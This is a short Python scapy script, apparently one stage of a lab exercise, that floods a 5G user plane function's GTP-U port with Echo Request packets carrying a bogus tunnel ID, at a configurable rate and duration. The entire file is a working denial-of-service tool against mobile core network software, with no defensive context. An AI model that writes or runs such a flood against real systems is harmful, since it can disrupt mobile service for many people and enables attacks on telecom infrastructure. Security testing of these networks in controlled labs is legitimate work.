#!/usr/bin/env python3
from scapy.all import IP, UDP, send
from scapy.contrib.gtp import GTP_U_Header, GTPEchoRequest
import time
import sys

UPF_ADDRESS = "192.168.134.128"
UPF_GTPU_PORT = 2152

def build_packet(bogus_teid):
    # gtp_type=1 = Echo Request — minimal, always-valid GTP-U control
    # message that UPF should actually parse and respond to
    return (
        IP(dst=UPF_ADDRESS) /
        UDP(dport=UPF_GTPU_PORT) /
        GTP_U_Header(teid=bogus_teid, gtp_type=1) /
        GTPEchoRequest()
    )

def flood(duration_seconds=10, rate_per_second=1000):
    print(f"[*] Stage 11 - GTP-U flood against {UPF_ADDRESS}:{UPF_GTPU_PORT}")
    print(f"[*] Duration: {duration_seconds}s, target rate: ~{rate_per_second}/s\n")

    pkt = build_packet(bogus_teid=0xDEADBEEF)
    pkt.show()  # print the constructed packet once, to confirm it's well-formed
    print()

    end_time = time.time() + duration_seconds
    sent = 0
    try:
        while time.time() < end_time:
            send(pkt, count=rate_per_second // 10, inter=0.0001, verbose=False)
            sent += rate_per_second // 10
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n[*] Stopped early by user.")
    print(f"[*] Total packets sent: {sent}")

if __name__ == "__main__":
    duration = int(sys.argv[1]) if len(sys.argv) > 1 else 10
    rate = int(sys.argv[2]) if len(sys.argv) > 2 else 1000
    flood(duration, rate)
